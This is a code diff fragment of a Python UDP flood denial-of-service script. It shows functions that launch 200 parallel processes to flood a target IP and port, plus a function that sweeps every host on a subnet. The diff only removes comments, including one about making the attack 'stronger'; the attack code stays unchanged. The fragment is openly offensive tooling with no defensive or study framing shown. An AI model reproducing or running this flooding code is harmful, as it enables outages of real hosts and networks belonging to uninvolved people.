@@ -44,10 +44,10 @@ def udp_flood(target_ip, target_port, count, packets_per_process=1000):
         if count % 100 == 0:  
             print(f"Sent {count} packets to {target_ip}:{target_port}")
 
-# Function to start the attack using multiprocessing
+
 def start_attack(target_ip, target_port):
     processes = []
-    for i in range(200):  # Increase the number of processes to 200 for stronger attack
+    for i in range(200):  
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, i + 1))
         process.daemon = True
         processes.append(process)
@@ -56,7 +56,7 @@ def start_attack(target_ip, target_port):
     for process in processes:
         process.join()
 
-# Function to attack an entire network
+
 def attack_network(network_ip, target_port):
     net = ipaddress.IPv4Network(network_ip, strict=False)
     for ip in net.hosts():  # Identify the devices within the network
